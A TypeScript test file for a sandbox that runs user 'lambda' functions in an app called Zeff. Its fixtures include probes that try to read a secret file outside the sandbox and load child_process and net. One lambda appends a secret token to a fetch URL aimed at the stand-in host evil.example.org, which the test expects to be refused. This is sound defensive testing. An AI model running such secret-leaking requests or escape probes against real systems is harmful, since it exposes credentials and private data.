import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { setupTempData } from "./helpers";

setupTempData();

/**
 * Lambdas: a function's own Node process — it reads its own folder only, writes nothing, starts nothing; its fetch goes through Zeff
 * (the domains its manifest names, never a private address), so do the Zeff functions it names; what it returns is checked against its
 * kind; a secret never shows in an error or its log. The lookups' sources are lambdas, and a change of one stays beside Zeff's.
 */

async function world() {
  const { setInstalled } = await import("@/plugins/state");
  for (const id of ["workspace", "lookups", "studio"]) setInstalled(id, true);
  await import("@/plugins/contributions");
  return { store: await import("@/plugins/workspace/lambdas/store"), run: await import("@/plugins/workspace/lambdas/run") };
}
let n = 0;
const PUBLIC = async () => ["93.184.216.34"];
const lam = (code: string, manifest: Record<string, unknown> = {}) => ({ manifest: { name: `t.l${++n}`, label: "t", what: "t", kind: "function", ...manifest }, files: { "index.mjs": code } });
const err = (r: { ok: boolean }) => (r.ok ? "" : (r as unknown as { error: string }).error);

test("the sandbox: no reading outside its folder, no writing, no processes, no sockets, no environment", async () => {
  const { store, run } = await world();
  const outside = path.join(os.tmpdir(), `zeff-lambda-secret-${Date.now()}.txt`);
  fs.writeFileSync(outside, "secret");
  const l = store.createLambda(
    lam(`import fs from "node:fs";
export async function handler() {
  const r = {};
  try { fs.readFileSync(${JSON.stringify(outside)}); r.read = "READ"; } catch (e) { r.read = e.code; }
  try { fs.writeFileSync("x.txt", "x"); r.write = "WROTE"; } catch (e) { r.write = e.code; }
  try { await import("node:child_process"); r.child = "LOADED"; } catch (e) { r.child = "refused"; }
  try { await import("node:net"); r.net = "LOADED"; } catch (e) { r.net = "refused"; }
  r.env = Object.keys(process.env).filter((k) => !/^(SYSTEMROOT|NODE_ENV)$/i.test(k)).length;
  return r;
}`),
  );
  const r = await run.runLambda(l, {});
  assert.ok(r.ok, err(r));
  assert.deepEqual(r.ok && r.result, { read: "ERR_ACCESS_DENIED", write: "ERR_ACCESS_DENIED", child: "refused", net: "refused", env: 0 });
});

test("fetch goes through Zeff: only the manifest's domains, never a private address; a secret stays out of errors and logs", async () => {
  const { store, run } = await world();
  const { setSecret } = await import("@/plugins/workspace/flows/store");
  setSecret("DEMO_TOKEN", "tok-987654321");
  const realFetch = globalThis.fetch;
  globalThis.fetch = (async (url: string | URL) => Response.json({ got: String(url) })) as typeof fetch;
  try {
    const l = store.createLambda(
      lam(`export async function handler(event, context) {
  context.log("token is", context.secrets.DEMO_TOKEN);
  const r = await fetch(event.url + "?k=" + context.secrets.DEMO_TOKEN);
  return await r.json();
}`, { web: ["api.example.com"], secrets: ["DEMO_TOKEN"] }),
    );
    const ok = await run.runLambda(l, { url: "https://api.example.com/x" }, { resolve: PUBLIC });
    assert.ok(ok.ok, err(ok));
    assert.deepEqual(ok.ok && ok.result, { got: "https://api.example.com/x?k=tok-987654321" });
    assert.ok(ok.logs.every((x) => !x.includes("tok-987654321")) && ok.logs[0].includes("•••"), "the log hides it");
    const other = await run.runLambda(l, { url: "https://evil.example.org/x" }, { resolve: PUBLIC });
    assert.match(err(other), /may not reach evil\.example\.org/);
    assert.ok(!err(other).includes("tok-987654321"), "the error hides it");
    const priv = await run.runLambda(l, { url: "https://api.example.com/x" }, { resolve: async () => ["192.168.1.10"] });
    assert.match(err(priv), /private network/);
  } finally {
    globalThis.fetch = realFetch;
  }
});

test("what it returns is checked: a function against its schema, a lookup's hits and fields against its manifest", async () => {
  const { store, run } = await world();
  const fn = store.createLambda(lam(`export const handler = async (e) => ({ total: e.n * 2 });`, { output: { type: "object", properties: { total: { type: "integer" } }, required: ["total"] } }));
  const good = await run.invokeLambda(fn.manifest.name, { n: 21 });
  assert.deepEqual(good.ok && good.result, { total: 42 });
  const bad = await run.invokeLambda(fn.manifest.name, { n: 1.25 });
  assert.match(err(bad), /output\.total: integer/);
  const look = store.createLambda(
    lam(`export async function handler(e) {
  if (e.mode === "search") return e.query === "bad" ? { hits: [{ title: 3 }] } : { hits: [{ id: 7, title: "Dune", image: "http://x/y.jpg" }] };
  return e.id === "bad" ? { fields: { title: "A", nope: 1 } } : { fields: { title: "A", year: 1999, tags: ["x"] } };
}`, { kind: "lookup", fields: { title: "t", year: "y", tags: "l" } }),
  );
  assert.deepEqual(await run.lookupSearch(look.manifest.name, "dune", "de-DE"), [{ id: "7", title: "Dune" }], "ids made texts, an http picture left out");
  await assert.rejects(run.lookupSearch(look.manifest.name, "bad", "de-DE"), /hits\[0\]\.id.*hits\[0\]\.title/);
  assert.deepEqual(await run.lookupDetails(look.manifest.name, "1", "de-DE"), { title: "A", year: 1999, tags: ["x"] });
  await assert.rejects(run.lookupDetails(look.manifest.name, "bad", "de-DE"), /fields\.nope: not in lambda\.json/);
  const { lookupSources } = await import("@/plugins/workspace/lookups");
  assert.ok(lookupSources().some((s) => s.id === look.manifest.name), "a lookup lambda is a lookup source");
});

test("time and errors: an endless loop is stopped, a throw comes back with its message, Zeff functions only when named", async () => {
  const { store, run } = await world();
  const loop = store.createLambda(lam(`export async function handler() { for (;;) {} }`, { timeoutMs: 1500 }));
  assert.match(err(await run.runLambda(loop, {})), /longer than 1\.5 s/);
  const boom = store.createLambda(lam(`export async function handler() { throw new Error("kaputt"); }`));
  assert.equal(err(await run.runLambda(boom, {})), "kaputt");
  const call = store.createLambda(lam(`export const handler = (e, c) => c.zeff.call(e.fn, {});`, { zeff: ["time.now"] }));
  const now = await run.runLambda(call, { fn: "time.now" });
  assert.ok(now.ok && typeof (now.result as { today: string }).today === "string", err(now));
  assert.match(err(await run.runLambda(call, { fn: "notify" })), /may not call “notify”/);
});

test("the lookups' sources are lambdas; a change of one is kept beside Zeff's and reset gives Zeff's back", async () => {
  const { store } = await world();
  const builtin = store.getLambda("tmdb.movies")!;
  assert.ok(builtin.builtin && !builtin.changed && builtin.files["index.mjs"].includes("api.themoviedb.org") && builtin.files["lib.mjs"].includes("getJson"));
  for (const id of ["tmdb.movies", "tmdb.tv", "wikipedia", "openlibrary", "google.books", "google.knowledge", "web.search"]) assert.ok(store.getLambda(id), id);
  store.saveLambda({ manifest: { ...builtin.manifest, label: "Meine Filme" }, files: builtin.files });
  assert.equal(store.getLambda("tmdb.movies")!.manifest.label, "Meine Filme");
  assert.equal(store.getLambda("tmdb.movies")!.changed, true);
  assert.throws(() => store.saveLambda({ manifest: { ...builtin.manifest, name: "x.y" }, files: builtin.files, previous: "tmdb.movies" }), /keeps its name/);
  store.deleteLambda("tmdb.movies");
  assert.equal(store.getLambda("tmdb.movies")!.changed, false, "reset: Zeff's again");
});
